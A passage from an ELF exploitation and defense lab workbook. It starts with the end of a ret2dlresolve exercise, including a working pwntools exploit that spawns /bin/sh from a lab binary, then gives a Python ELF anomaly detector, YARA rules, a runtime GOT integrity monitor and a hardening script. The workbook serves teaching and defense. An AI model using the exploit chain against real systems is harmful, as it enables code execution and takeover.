    sys.exit(1)

# For rdx (count), many binaries leave it large enough from printf
# If not, we'd need a pop rdx gadget — skip for now
payload += p64(read_plt)

# Second: set up argument for system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(binsh_addr)

# Third: trigger _dl_runtime_resolve with our fake reloc_index
# Push reloc_index and jump to PLT[0]
# PLT[0] expects: [rsp] = reloc_index, [rsp+8] = link_map (already on stack)
# Actually, the standard way is to jump to PLT0 with reloc_index on stack
# But on x86_64, PLT stub pushes the index then jumps to PLT0
# We can simulate this by jumping to PLT0+6 (after the push of link_map addr)
# Or use the Ret2dlresolve helper from pwntools

# Using pwntools' built-in (cleaner approach for demonstration):
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

print(f"\n[*] Payload structure:")
print(f"    Overflow: {OFFSET} bytes")
print(f"    ROP chain: read() to stage + dlresolve trigger")
print(f"\n[+] Exploit ready. Run against the binary.")
print(f"[+] In production, pipe the two stages via stdin.")
```

```bash
# Run the analysis
python3 exploit_dlresolve.py

# For a working exploit with pwntools automation:
python3 << 'EOF'
from pwn import *

context.binary = elf = ELF('./vuln_dlresolve')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = flat({64 + 8: rop.chain()})

p = process('./vuln_dlresolve')
p.sendline(payload)
p.sendline(dlresolve.payload)
p.interactive()
EOF
```

**Key insight:** ret2dlresolve works because `_dl_fixup` trusts the relocation structures pointed to by `DT_JMPREL`. If an attacker can write to a known writable address and pivot the relocation index past the legitimate `.rela.plt`, the resolver will happily process fake `Elf64_Rela` → fake `Elf64_Sym` → fake string, resolving any symbol the attacker names.

---

## PART B: DEFENSIVE — Detection and Protection Systems

### Exercise B1: Building an ELF Anomaly Detection Engine

**Objective:** Create a Python-based static analysis tool that flags ELF binaries exhibiting suspicious header characteristics, based on the detection signals identified in the reference material.

**Concepts tested:** All ELF header fields, normal vs. anomalous value ranges, batch triage pipeline design.

```python
#!/usr/bin/env python3
"""
elf_anomaly_detector.py — Static ELF anomaly detection engine
Flags binaries with suspicious header characteristics that indicate
packing, manual crafting, anti-analysis, or exploitation artifacts.

Usage: python3 elf_anomaly_detector.py <binary_or_directory>
"""
import sys
import os
import struct
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Optional
from enum import IntEnum

class Severity(IntEnum):
    INFO = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

@dataclass
class Finding:
    severity: Severity
    category: str
    description: str
    details: str = ""
    offset: int = 0

@dataclass
class ELFAnalysis:
    path: str
    findings: List[Finding] = field(default_factory=list)
    parse_error: Optional[str] = None
    
    @property
    def max_severity(self) -> Severity:
        if not self.findings:
            return Severity.INFO
        return max(f.severity for f in self.findings)
    
    def add(self, severity, category, description, details="", offset=0):
        self.findings.append(Finding(severity, category, description, details, offset))

class ELFAnomalyDetector:
    """
    Checks performed:
    1. Magic validation
    2. Header field range checks
    3. Section/Program header consistency
    4. Segment permission anomalies (W^X violations)
    5. Entry point validity
    6. RELRO status
    7. Stack executability
    8. DT_TEXTREL presence
    9. Section table integrity
    10. Overlay detection (data past mapped segments)
    11. PT_NOTE abuse
    12. e_ident padding non-zero
    13. Unusual e_type for context
    14. Missing standard sections
    15. Hash table presence/absence
    """
    
    def __init__(self, data: bytes):
        self.data = data
        self.is_64bit = None
        self.endian = '<'  # little-endian default
        
    def u8(self, off): return struct.unpack_from('B', self.data, off)[0]
    def u16(self, off): return struct.unpack_from(f'{self.endian}H', self.data, off)[0]
    def u32(self, off): return struct.unpack_from(f'{self.endian}I', self.data, off)[0]
    def u64(self, off): return struct.unpack_from(f'{self.endian}Q', self.data, off)[0]
    
    def ptr(self, off):
        return self.u64(off) if self.is_64bit else self.u32(off)
    
    def analyze(self, path: str) -> ELFAnalysis:
        result = ELFAnalysis(path=path)
        
        if len(self.data) < 64:
            result.parse_error = "File too small for ELF header"
            return result
        
        # Check magic
        if self.data[:4] != b'\x7fELF':
            result.parse_error = "Not an ELF file"
            return result
        
        self._check_ident(result)
        self._check_header_fields(result)
        self._check_program_headers(result)
        self._check_section_headers(result)
        self._check_dynamic(result)
        self._check_overlay(result)
        
        return result
    
    def _check_ident(self, result: ELFAnalysis):
        ei_class = self.u8(4)
        ei_data = self.u8(5)
        ei_version = self.u8(6)
        ei_osabi = self.u8(7)
        ei_abiversion = self.u8(8)
        
        if ei_class == 2:
            self.is_64bit = True
        elif ei_class == 1:
            self.is_64bit = False
        else:
            result.add(Severity.HIGH, "header", 
                      f"Invalid EI_CLASS: {ei_class}", offset=4)
            self.is_64bit = True  # assume 64 for parsing
        
        if ei_data == 1:
            self.endian = '<'
        elif ei_data == 2:
            self.endian = '>'
        else:
            result.add(Severity.HIGH, "header",
                      f"Invalid EI_DATA: {ei_data}", offset=5)
        
        if ei_version != 1:
            result.add(Severity.MEDIUM, "header",
                      f"Unusual EI_VERSION: {ei_version} (expected 1)", offset=6)
        
        # Check padding bytes (should be zero)
        padding = self.data[9:16]
        if any(b != 0 for b in padding):
            result.add(Severity.MEDIUM, "anti-analysis",
                      "Non-zero e_ident padding — possible data smuggling",
                      f"Padding bytes: {padding.hex()}", offset=9)
    
    def _check_header_fields(self, result: ELFAnalysis):
        if self.is_64bit:
            e_type = self.u16(16)
            e_machine = self.u16(18)
            e_version = self.u32(20)
            e_entry = self.u64(24)
            e_phoff = self.u64(32)
            e_shoff = self.u64(40)
            e_flags = self.u32(48)
            e_ehsize = self.u16(52)
            e_phentsize = self.u16(54)
            e_phnum = self.u16(56)
            e_shentsize = self.u16(58)
            e_shnum = self.u16(60)
            e_shstrndx = self.u16(62)
        else:
            e_type = self.u16(16)
            e_machine = self.u16(18)
            e_version = self.u32(20)
            e_entry = self.u32(24)
            e_phoff = self.u32(28)
            e_shoff = self.u32(32)
            e_flags = self.u32(36)
            e_ehsize = self.u16(40)
            e_phentsize = self.u16(42)
            e_phnum = self.u16(44)
            e_shentsize = self.u16(46)
            e_shnum = self.u16(48)
            e_shstrndx = self.u16(50)
        
        # Check e_ehsize
        expected_ehsize = 64 if self.is_64bit else 52
        if e_ehsize != expected_ehsize:
            result.add(Severity.HIGH, "header",
                      f"Anomalous e_ehsize: {e_ehsize} (expected {expected_ehsize})",
                      offset=52 if self.is_64bit else 40)
        
        # Check e_phentsize
        expected_phentsize = 56 if self.is_64bit else 32
        if e_phnum > 0 and e_phentsize != expected_phentsize:
            result.add(Severity.HIGH, "header",
                      f"Anomalous e_phentsize: {e_phentsize} (expected {expected_phentsize})")
        
        # Check e_shentsize
        expected_shentsize = 64 if self.is_64bit else 40
        if e_shnum > 0 and e_shentsize != expected_shentsize:
            result.add(Severity.HIGH, "header",
                      f"Anomalous e_shentsize: {e_shentsize} (expected {expected_shentsize})")
        
        # Check e_phoff bounds
        if e_phoff > 0 and e_phoff + e_phnum * e_phentsize > len(self.data):
            result.add(Severity.CRITICAL, "header",
                      "Program header table extends past end of file",
                      f"e_phoff=0x{e_phoff:x}, table_end=0x{e_phoff + e_phnum * e_phentsize:x}, "
                      f"file_size=0x{len(self.data):x}")
        
        # Check e_shoff bounds
        if e_shoff > 0 and e_shoff + e_shnum * e_shentsize > len(self.data):
            result.add(Severity.HIGH, "anti-analysis",
                      "Section header table extends past end of file",
                      f"e_shoff=0x{e_shoff:x}, may be deliberately corrupted")
        
        # Missing section header table
        if e_shoff == 0 or e_shnum == 0:
            if e_type in (2, 3):  # ET_EXEC or ET_DYN
                result.add(Severity.MEDIUM, "anti-analysis",
                          "No section header table (stripped or manually crafted)")
        
        # Entry point in non-executable segment
        if e_entry > 0 and e_phoff > 0:
            self._entry_in_phdr = (e_entry, e_phoff, e_phnum, e_phentsize)
        
        # Store for later use
        self._e_phoff = e_phoff
        self._e_phnum = e_phnum
        self._e_phentsize = e_phentsize
        self._e_shoff = e_shoff
        self._e_shnum = e_shnum
        self._e_shentsize = e_shentsize
        self._e_entry = e_entry
        self._e_type = e_type
    
    def _check_program_headers(self, result: ELFAnalysis):
        if not hasattr(self, '_e_phoff') or self._e_phoff == 0:
            return
        
        has_interp = False
        has_dynamic = False
        has_gnu_relro = False
        has_gnu_stack = False
        stack_executable = False
        has_wxe_segment = False
        entry_in_exec = False
        
        phdr_size = 56 if self.is_64bit else 32
        
        for i in range(self._e_phnum):
            off = self._e_phoff + i * self._e_phentsize
            if off + phdr_size > len(self.data):
                break
            
            if self.is_64bit:
                p_type = self.u32(off)
                p_flags = self.u32(off + 4)
                p_offset = self.u64(off + 8)
                p_vaddr = self.u64(off + 16)
                p_filesz = self.u64(off + 32)
                p_memsz = self.u64(off + 40)
            else:
                p_type = self.u32(off)
                p_offset = self.u32(off + 4)
                p_vaddr = self.u32(off + 8)
                p_filesz = self.u32(off + 16)
                p_memsz = self.u32(off + 20)
                p_flags = self.u32(off + 24)
            
            # PT_LOAD checks
            if p_type == 1:  # PT_LOAD
                # W^X violation
                if (p_flags & 0x2) and (p_flags & 0x1):  # PF_W and PF_X
                    result.add(Severity.HIGH, "permissions",
                              f"PT_LOAD segment {i} is both Writable and Executable (W^X violation)",
                              f"vaddr=0x{p_vaddr:x}, flags=0x{p_flags:x}")
                    has_wxe_segment = True
                
                # Check if entry is in an executable segment
                if (p_flags & 0x1) and self._e_entry >= p_vaddr and \
                   self._e_entry < p_vaddr + p_memsz:
                    entry_in_exec = True
            
            elif p_type == 3:  # PT_INTERP
                has_interp = True
            elif p_type == 2:  # PT_DYNAMIC
                has_dynamic = True
            elif p_type == 0x6474E552:  # PT_GNU_RELRO
                has_gnu_relro = True
            elif p_type == 0x6474E551:  # PT_GNU_STACK
                has_gnu_stack = True
                if p_flags & 0x1:  # PF_X
                    stack_executable = True
        
        # Entry not in any executable segment
        if self._e_entry > 0 and not entry_in_exec:
            result.add(Severity.CRITICAL, "entry-point",
                      "Entry point not within any executable PT_LOAD segment",
                      f"e_entry=0x{self._e_entry:x}")
        
        # Executable stack
        if stack_executable:
            result.add(Severity.HIGH, "permissions",
                      "Executable stack (PT_GNU_STACK has PF_X)",
                      "Indicates either JIT, legacy code, or deliberate exploit setup")
        elif not has_gnu_stack:
            result.add(Severity.MEDIUM, "missing-mitigation",
                      "No PT_GNU_STACK segment (stack executability depends on kernel default)")
        
        # Dynamic binary without RELRO
        if has_dynamic and not has_gnu_relro:
            result.add(Severity.MEDIUM, "missing-mitigation",
                      "Dynamic binary without PT_GNU_RELRO (GOT fully writable)")
        
        # Dynamic binary without interpreter (unusual)
        if has_dynamic and not has_interp and self._e_type != 3:
            result.add(Severity.MEDIUM, "anomaly",
                      "Has PT_DYNAMIC but no PT_INTERP")
    
    def _check_section_headers(self, result: ELFAnalysis):
        if self._e_shoff == 0 or self._e_shnum == 0:
            return
        
        shdr_size = 64 if self.is_64bit else 40
        
        # Basic section header consistency checks
        for i in range(self._e_shnum):
            off = self._e_shoff + i * self._e_shentsize
            if off + shdr_size > len(self.data):
                result.add(Severity.HIGH, "section-table",
                          f"Section header {i} extends past EOF")
                break
            
            if self.is_64bit:
                sh_type = self.u32(off + 4)
                sh_flags = self.u64(off + 8)
                sh_addr = self.u64(off + 16)
                sh_offset = self.u64(off + 24)
                sh_size = self.u64(off + 32)
            else:
                sh_type = self.u32(off + 4)
                sh_flags = self.u32(off + 8)
                sh_addr = self.u32(off + 12)
                sh_offset = self.u32(off + 16)
                sh_size = self.u32(off + 20)
            
            # Section with SHF_ALLOC that points outside file
            if (sh_flags & 0x2) and sh_type != 8:  # SHF_ALLOC, not SHT_NOBITS
                if sh_offset + sh_size > len(self.data) and sh_size > 0:
                    result.add(Severity.MEDIUM, "section-table",
                              f"Section {i} (ALLOC) extends past EOF",
                              f"offset=0x{sh_offset:x}, size=0x{sh_size:x}")
    
    def _check_dynamic(self, result: ELFAnalysis):
        """Check .dynamic section for security-relevant flags"""
        # Find PT_DYNAMIC to locate .dynamic
        if not hasattr(self, '_e_phoff') or self._e_phoff == 0:
            return
        
        dynamic_offset = None
        dynamic_size = None
        
        for i in range(self._e_phnum):
            off = self._e_phoff + i * self._e_phentsize
            if off + 56 > len(self.data):
                break
            p_type = self.u32(off)
            if p_type == 2:  # PT_DYNAMIC
                if self.is_64bit:
                    dynamic_offset = self.u64(off + 8)
                    dynamic_size = self.u64(off + 32)
                else:
                    dynamic_offset = self.u32(off + 4)
                    dynamic_size = self.u32(off + 16)
                break
        
        if dynamic_offset is None:
            return
        
        has_bind_now = False
        has_textrel = False
        has_rpath = False
        has_runpath = False
        dt_debug_present = False
        
        entry_size = 16 if self.is_64bit else 8
        pos = dynamic_offset
        
        while pos + entry_size <= len(self.data):
            if self.is_64bit:
                d_tag = struct.unpack_from(f'{self.endian}q', self.data, pos)[0]
                d_val = self.u64(pos + 8)
            else:
                d_tag = struct.unpack_from(f'{self.endian}i', self.data, pos)[0]
                d_val = self.u32(pos + 4)
            
            if d_tag == 0:  # DT_NULL
                break
            elif d_tag == 24:  # DT_TEXTREL
                has_textrel = True
            elif d_tag == 30:  # DT_FLAGS
                if d_val & 0x8:  # DF_BIND_NOW
                    has_bind_now = True
                if d_val & 0x4:  # DF_TEXTREL
                    has_textrel = True
            elif d_tag == 0x6FFFFFFB:  # DT_FLAGS_1
                if d_val & 0x1:  # DF_1_NOW
                    has_bind_now = True
            elif d_tag == 15:  # DT_RPATH
                has_rpath = True
            elif d_tag == 29:  # DT_RUNPATH
                has_runpath = True
            elif d_tag == 21:  # DT_DEBUG
                dt_debug_present = True
            
            pos += entry_size
        
        if has_textrel:
            result.add(Severity.HIGH, "permissions",
                      "DT_TEXTREL present — text segment made writable during relocation",
                      "Indicates non-PIC code or deliberate loader abuse")
        
        if not has_bind_now:
            result.add(Severity.LOW, "mitigation-absent",
                      "No BIND_NOW (lazy binding active — GOT.PLT remains writable)")
        
        if has_rpath:
            result.add(Severity.MEDIUM, "library-search",
                      "DT_RPATH set — fixed library search path (potential hijack vector)")
    
    def _check_overlay(self, result: ELFAnalysis):
        """Check for data appended past the last mapped segment"""
        if not hasattr(self, '_e_phoff') or self._e_phoff == 0:
            return
        
        max_file_end = 0
        
        for i in range(self._e_phnum):
            off = self._e_phoff + i * self._e_phentsize
            if off + 56 > len(self.data):
                break
            p_type = self.u32(off)
            if p_type == 1:  # PT_LOAD
                if self.is_64bit:
                    p_offset = self.u64(off + 8)
                    p_filesz = self.u64(off + 32)
                else:
                    p_offset = self.u32(off + 4)
                    p_filesz = self.u32(off + 16)
                seg_end = p_offset + p_filesz
                if seg_end > max_file_end:
                    max_file_end = seg_end
        
        # Also consider section header table
        if self._e_shoff > 0:
            sht_end = self._e_shoff + self._e_shnum * self._e_shentsize
            if sht_end > max_file_end:
                max_file_end = sht_end
        
        overlay_size = len(self.data) - max_file_end
        if overlay_size > 1024:  # Significant overlay
            result.add(Severity.MEDIUM, "overlay",
                      f"Significant overlay data: {overlay_size} bytes past mapped content",
                      "May contain embedded payloads, configuration, or packed stages")


def scan_file(path: str) -> ELFAnalysis:
    try:
        with open(path, 'rb') as f:
            data = f.read()
    except (IOError, PermissionError) as e:
        result = ELFAnalysis(path=path)
        result.parse_error = str(e)
        return result
    
    detector = ELFAnomalyDetector(data)
    return detector.analyze(path)


def scan_directory(dirpath: str) -> List[ELFAnalysis]:
    results = []
    for root, dirs, files in os.walk(dirpath):
        for fname in files:
            fpath = os.path.join(root, fname)
            if os.path.isfile(fpath) and not os.path.islink(fpath):
                try:
                    with open(fpath, 'rb') as f:
                        magic = f.read(4)
                    if magic == b'\x7fELF':
                        results.append(scan_file(fpath))
                except (IOError, PermissionError):
                    continue
    return results


def print_results(results: List[ELFAnalysis]):
    severity_colors = {
        Severity.INFO: '\033[37m',
        Severity.LOW: '\033[36m',
        Severity.MEDIUM: '\033[33m',
        Severity.HIGH: '\033[31m',
        Severity.CRITICAL: '\033[1;31m',
    }
    reset = '\033[0m'
    
    for analysis in sorted(results, key=lambda a: a.max_severity, reverse=True):
        if analysis.parse_error:
            print(f"  [SKIP] {analysis.path}: {analysis.parse_error}")
            continue
        
        if not analysis.findings:
            continue
        
        color = severity_colors.get(analysis.max_severity, '')
        print(f"\n{color}{'='*60}")
        print(f"  {analysis.path}")
        print(f"  Max Severity: {analysis.max_severity.name}")
        print(f"{'='*60}{reset}")
        
        for finding in sorted(analysis.findings, key=lambda f: f.severity, reverse=True):
            fc = severity_colors.get(finding.severity, '')
            print(f"  {fc}[{finding.severity.name:8s}]{reset} "
                  f"({finding.category}) {finding.description}")
            if finding.details:
                print(f"             {finding.details}")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file_or_directory>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if os.path.isdir(target):
        print(f"[*] Scanning directory: {target}")
        results = scan_directory(target)
    else:
        results = [scan_file(target)]
    
    print_results(results)
    
    # Summary
    total = len(results)
    critical = sum(1 for r in results if r.max_severity >= Severity.CRITICAL)
    high = sum(1 for r in results if r.max_severity == Severity.HIGH)
    print(f"\n{'='*60}")
    print(f"  Scanned: {total} | Critical: {critical} | High: {high}")
    print(f"{'='*60}")
```

```bash
# Save and test against lab samples
cd ~/elf-lab
python3 bin/elf_anomaly_detector.py samples/
python3 bin/elf_anomaly_detector.py samples/hello_pie_fakesections
python3 bin/elf_anomaly_detector.py samples/minimal_elf
```

**Expected output:** The detector flags the fake-sections binary for section table inconsistencies, flags the minimal ELF for missing section table, and identifies mitigation gaps in all binaries.

---

### Exercise B2: YARA Rules for ELF Anomaly Detection

**Objective:** Write production-grade YARA rules that detect ELF manipulation techniques demonstrated in Part A, suitable for deployment in a malware analysis pipeline.

```yara
// elf_anomaly_rules.yar — ELF structural anomaly detection
// Deploy in ingestion pipelines, sandbox preprocessing, or EDR

import "elf"
import "math"

rule ELF_No_Section_Headers {
    meta:
        description = "ELF binary with no section header table"
        severity = "medium"
        technique = "T1027 - Obfuscated Files"
        false_positive = "Some IoT firmware, stripped release binaries"
    condition:
        uint32(0) == 0x464C457F and  // ELF magic
        (
            // 64-bit: e_shnum at offset 60 == 0
            (uint8(4) == 2 and uint16(60) == 0) or
            // 32-bit: e_shnum at offset 48 == 0
            (uint8(4) == 1 and uint16(48) == 0)
        )
}

rule ELF_Executable_Stack {
    meta:
        description = "ELF with executable stack (PT_GNU_STACK has PF_X)"
        severity = "high"
        technique = "T1055 - Process Injection preparation"
    condition:
        elf.type == elf.ET_EXEC or elf.type == elf.ET_DYN and
        for any seg in elf.segments : (
            seg.type == elf.PT_GNU_STACK and
            seg.flags & elf.PF_X != 0
        )
}

rule ELF_WX_Segment {
    meta:
        description = "PT_LOAD segment with both Write and Execute permissions"
        severity = "high"
        technique = "T1027.002 - Software Packing"
    condition:
        elf.type == elf.ET_EXEC or elf.type == elf.ET_DYN and
        for any seg in elf.segments : (
            seg.type == elf.PT_LOAD and
            seg.flags & elf.PF_W != 0 and
            seg.flags & elf.PF_X != 0
        )
}

rule ELF_DT_TEXTREL {
    meta:
        description = "Binary requires text relocations (text segment made writable)"
        severity = "medium"
        technique = "Unusual linker behavior"
    condition:
        elf.type == elf.ET_DYN and
        elf.dynamic_section_entries > 0 and
        for any entry in elf.dynamic : (
            entry.tag == elf.DT_TEXTREL or
            (entry.tag == elf.DT_FLAGS and entry.val & 0x4 != 0)
        )
}

rule ELF_No_RELRO {
    meta:
        description = "Dynamic binary without GNU_RELRO (full GOT attack surface)"
        severity = "low"
        note = "Absence is an observation, not necessarily malicious"
    condition:
        elf.type == elf.ET_DYN and
        elf.dynamic_section_entries > 0 and
        not for any seg in elf.segments : (
            seg.type == elf.PT_GNU_RELRO
        )
}

rule ELF_Entry_Outside_Text {
    meta:
        description = "Entry point doesn't fall within any executable PT_LOAD"
        severity = "critical"
        technique = "T1027 - Obfuscated Files / Packed binary"
    condition:
        uint32(0) == 0x464C457F and
        elf.entry_point > 0 and
        not for any seg in elf.segments : (
            seg.type == elf.PT_LOAD and
            seg.flags & elf.PF_X != 0 and
            elf.entry_point >= seg.virtual_address and
            elf.entry_point < seg.virtual_address + seg.memory_size
        )
}

rule ELF_Padding_Data_Smuggling {
    meta:
        description = "Non-zero bytes in e_ident padding (possible data hiding)"
        severity = "medium"
        technique = "T1001.001 - Data Obfuscation: Junk Data"
    condition:
        uint32(0) == 0x464C457F and
        // Bytes 9-15 of e_ident should be zero padding
        (uint8(9) != 0 or uint8(10) != 0 or uint8(11) != 0 or
         uint8(12) != 0 or uint8(13) != 0 or uint8(14) != 0 or
         uint8(15) != 0)
}

rule ELF_Tiny_Binary {
    meta:
        description = "Suspiciously small ELF binary (possible dropper/shellcode)"
        severity = "medium"
        technique = "T1059 - Command and Scripting Interpreter"
    condition:
        uint32(0) == 0x464C457F and
        filesize < 2048 and
        // Has at least one PT_LOAD (actually executable)
        for any seg in elf.segments : (seg.type == elf.PT_LOAD)
}

rule ELF_Large_Overlay {
    meta:
        description = "Significant data appended past the last mapped segment"
        severity = "medium"
        technique = "T1027.001 - Binary Padding / Embedded payload"
    condition:
        uint32(0) == 0x464C457F and
        filesize > 10240 and  // Skip tiny files
        // Heuristic: file is >50% larger than the sum of PT_LOAD filesz
        // (This is approximate — proper check needs max(offset+filesz))
        for all seg in elf.segments : (
            seg.type == elf.PT_LOAD implies
            seg.offset + seg.file_size < filesize - 4096
        )
}

rule ELF_Static_No_Interp {
    meta:
        description = "Statically linked executable (no PT_INTERP)"
        severity = "info"
        note = "Static binaries evade LD_PRELOAD, userland hooks, and library interposition"
    condition:
        (elf.type == elf.ET_EXEC or elf.type == elf.ET_DYN) and
        not for any seg in elf.segments : (seg.type == elf.PT_INTERP)
}
```

```bash
# Test rules against lab samples
cd ~/elf-lab
yara -r yara-rules/elf_anomaly_rules.yar samples/
```

---

### Exercise B3: Building a GOT Integrity Monitor (Runtime Defense)

**Objective:** Create a shared library that, when loaded via `LD_PRELOAD`, monitors the GOT/PLT for unauthorized modifications at runtime — detecting GOT overwrites as they happen.

```c
// got_monitor.c — Runtime GOT integrity checker
// Compile: gcc -shared -fPIC -o got_monitor.so got_monitor.c -ldl -lpthread
// Use: LD_PRELOAD=./got_monitor.so ./target_application

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <link.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>
#include <time.h>

#define MAX_GOT_ENTRIES 4096
#define LOG_FILE "/tmp/got_monitor.log"
#define CHECK_INTERVAL_US 100000  // 100ms

typedef struct {
    void *address;          // GOT slot address
    void *expected_value;   // Last known good value
    const char *symbol;     // Symbol name (if known)
    int resolved;           // Whether symbol has been lazily resolved
} GOTEntry;

typedef struct {
    GOTEntry entries[MAX_GOT_ENTRIES];
    int count;
    pthread_mutex_t lock;
    pthread_t monitor_thread;
    volatile int running;
    FILE *logfile;
} GOTMonitor;

static GOTMonitor g_monitor = {
    .count = 0,
    .lock = PTHREAD_MUTEX_INITIALIZER,
    .running = 0,
    .logfile = NULL,
};

static void log_event(const char *level, const char *fmt, ...) {
    if (!g_monitor.logfile) return;
    
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char timestamp[32];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm);
    
    fprintf(g_monitor.logfile, "[%s] [%s] [PID=%d] ", timestamp, level, getpid());
    
    va_list args;
    va_start(args, fmt);
    vfprintf(g_monitor.logfile, fmt, args);
    va_end(args);
    
    fprintf(g_monitor.logfile, "\n");
    fflush(g_monitor.logfile);
}

// Callback for dl_iterate_phdr — finds GOT entries for each loaded object
static int map_got_entries(struct dl_phdr_info *info, size_t size, void *data) {
    const char *name = info->dlpi_name;
    if (!name || strlen(name) == 0) name = "[main]";
    
    // Find PT_DYNAMIC
    for (int i = 0; i < info->dlpi_phnum; i++) {
        if (info->dlpi_phdr[i].p_type != PT_DYNAMIC) continue;
        
        Elf64_Dyn *dyn = (Elf64_Dyn*)(info->dlpi_addr + info->dlpi_phdr[i].p_vaddr);
        
        Elf64_Addr pltgot = 0;
        Elf64_Rela *jmprel = NULL;
        size_t pltrelsz = 0;
        Elf64_Sym *symtab = NULL;
        char *strtab = NULL;
        
        for (Elf64_Dyn *d = dyn; d->d_tag != DT_NULL; d++) {
            switch (d->d_tag) {
                case DT_PLTGOT:  pltgot = d->d_un.d_ptr; break;
                case DT_JMPREL:  jmprel = (Elf64_Rela*)d->d_un.d_ptr; break;
                case DT_PLTRELSZ: pltrelsz = d->d_un.d_val; break;
                case DT_SYMTAB:  symtab = (Elf64_Sym*)d->d_un.d_ptr; break;
                case DT_STRTAB:  strtab = (char*)d->d_un.d_ptr; break;
            }
        }
        
        if (!jmprel || !symtab || !strtab || pltrelsz == 0) continue;
        
        size_t nrels = pltrelsz / sizeof(Elf64_Rela);
        
        pthread_mutex_lock(&g_monitor.lock);
        for (size_t j = 0; j < nrels && g_monitor.count < MAX_GOT_ENTRIES; j++) {
            Elf64_Rela *rel = &jmprel[j];
            uint32_t sym_idx = ELF64_R_SYM(rel->r_info);
            
            GOTEntry *entry = &g_monitor.entries[g_monitor.count];
            entry->address = (void*)rel->r_offset;
            entry->expected_value = *(void**)rel->r_offset;
            entry->symbol = &strtab[symtab[sym_idx].st_name];
            entry->resolved = 0;
            
            g_monitor.count++;
        }
        pthread_mutex_unlock(&g_monitor.lock);
        
        log_event("INFO", "Mapped %zu GOT entries from %s", nrels, name);
        break;
    }
    
    return 0;
}

// Snapshot current GOT values as baseline
static void snapshot_got(void) {
    pthread_mutex_lock(&g_monitor.lock);
    for (int i = 0; i < g_monitor.count; i++) {
        GOTEntry *entry = &g_monitor.entries[i];
        void *current = *(void**)entry->address;
        
        if (current != entry->expected_value) {
            if (!entry->resolved) {
                // First change — likely lazy resolution
                entry->expected_value = current;
                entry->resolved = 1;
                log_event("DEBUG", "Symbol resolved: %s -> %p",
                         entry->symbol, current);
            }
        }
    }
    pthread_mutex_unlock(&g_monitor.lock);
}

// Check for unauthorized GOT modifications
static void check_got_integrity(void) {
    pthread_mutex_lock(&g_monitor.lock);
    for (int i = 0; i < g_monitor.count; i++) {
        GOTEntry *entry = &g_monitor.entries[i];
        void *current = *(void**)entry->address;
        
        if (entry->resolved && current != entry->expected_value) {
            log_event("CRITICAL",
                     "GOT MODIFICATION DETECTED! Symbol: %s, "
                     "Address: %p, Expected: %p, Actual: %p",
                     entry->symbol, entry->address,
                     entry->expected_value, current);
            
            // Determine if the new value points to a legitimate library
            Dl_info dlinfo;
            if (dladdr(current, &dlinfo)) {
                log_event("CRITICAL",
                         "  New target: %s (%s+0x%lx)",
                         dlinfo.dli_sname ? dlinfo.dli_sname : "?",
                         dlinfo.dli_fname,
                         (unsigned long)((char*)current - (char*)dlinfo.dli_fbase));
            } else {
                log_event("CRITICAL",
                         "  New target %p NOT in any known library — likely shellcode!",
                         current);
            }
            
            // Option: kill the process to prevent exploitation
            // kill(getpid(), SIGKILL);
            
            // Option: restore the GOT entry
            // *(void**)entry->address = entry->expected_value;
        }
    }
    pthread_mutex_unlock(&g_monitor.lock);
}

// Monitor thread — periodically checks GOT integrity
static void *monitor_thread_func(void *arg) {
    (void)arg;
    
    // Wait for initial lazy resolution to settle
    usleep(500000);
    snapshot_got();
    
    log_event("INFO", "GOT integrity monitoring active (%d entries)", g_monitor.count);
    
    while (g_monitor.running) {
        check_got_integrity();
        usleep(CHECK_INTERVAL_US);
    }
    
    return NULL;
}

// Constructor — initializes monitoring before main() runs
__attribute__((constructor))
static void got_monitor_init(void) {
    g_monitor.logfile = fopen(LOG_FILE, "a");
    if (!g_monitor.logfile) {
        fprintf(stderr, "[GOT-Monitor] Cannot open log file: %s\n", LOG_FILE);
        return;
    }
    
    log_event("INFO", "GOT Monitor initializing...");
    
    // Map all GOT entries from loaded objects
    dl_iterate_phdr(map_got_entries, NULL);
    
    log_event("INFO", "Total GOT entries tracked: %d", g_monitor.count);
    
    // Start monitor thread
    g_monitor.running = 1;
    if (pthread_create(&g_monitor.monitor_thread, NULL, monitor_thread_func, NULL) != 0) {
        log_event("ERROR", "Failed to create monitor thread");
        g_monitor.running = 0;
    }
}

// Destructor
__attribute__((destructor))
static void got_monitor_fini(void) {
    g_monitor.running = 0;
    if (g_monitor.monitor_thread) {
        pthread_join(g_monitor.monitor_thread, NULL);
    }
    
    log_event("INFO", "GOT Monitor shutting down");
    
    if (g_monitor.logfile) {
        fclose(g_monitor.logfile);
    }
}
```

```bash
gcc -shared -fPIC -o got_monitor.so got_monitor.c -ldl -lpthread

# Test with the GOT hijack target from Exercise A2
LD_PRELOAD=./got_monitor.so ./target_got_hijack
# Attempt the GOT overwrite — the monitor should detect it

# Check the log
cat /tmp/got_monitor.log
```

**Expected output:** The monitor logs all initial lazy resolutions as DEBUG, then when the GOT is overwritten during the attack, it logs a CRITICAL alert with the old and new pointer values plus library resolution information.

---

### Exercise B4: Compiler Hardening Verification Script

**Objective:** Build a comprehensive binary hardening checker that verifies all ELF-level mitigations are properly applied.

```bash
#!/bin/bash
# hardening_check.sh — Comprehensive ELF hardening verification
# Usage: ./hardening_check.sh <binary>

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS="${GREEN}[PASS]${NC}"
FAIL="${RED}[FAIL]${NC}"
WARN="${YELLOW}[WARN]${NC}"

if [ $# -lt 1 ]; then
    echo "Usage: $0 <binary>"
    exit 1
fi

BINARY="$1"

if [ ! -f "$BINARY" ]; then
    echo "Error: $BINARY not found"
    exit 1
fi

echo "============================================"
echo " ELF Hardening Check: $BINARY"
